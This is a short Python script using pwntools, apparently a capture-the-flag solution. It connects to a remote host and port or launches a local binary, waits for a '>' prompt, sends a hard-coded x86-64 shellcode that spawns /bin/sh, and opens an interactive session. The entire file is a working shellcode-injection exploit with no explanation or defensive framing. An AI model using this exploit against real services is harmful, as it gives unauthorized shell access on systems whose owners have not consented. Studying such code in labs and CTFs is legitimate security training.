from pwn import *
import argparse

def main():
    parser = argparse.ArgumentParser(description="Exploit remote or local")
    parser.add_argument("-r", "--remote", help="Remote mode with IP and port", nargs=2, metavar=("IP", "PORT"))
    parser.add_argument("-l", "--local", help="Local mode with a binary", metavar="BINARY")
    args = parser.parse_args()

    if args.remote:
        ip, port = args.remote
        p = remote(ip, int(port))
    elif args.local:
        p = process(args.local)
    else:
        print("Please specify an execution mode (-r IP PORT or -l BINARY)")
        return
    
    shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
    print(f"Shellcode length: {len(shellcode)} bytes")
    
    p.sendlineafter(b'>', shellcode)
    p.interactive()

if __name__ == "__main__":
    main()


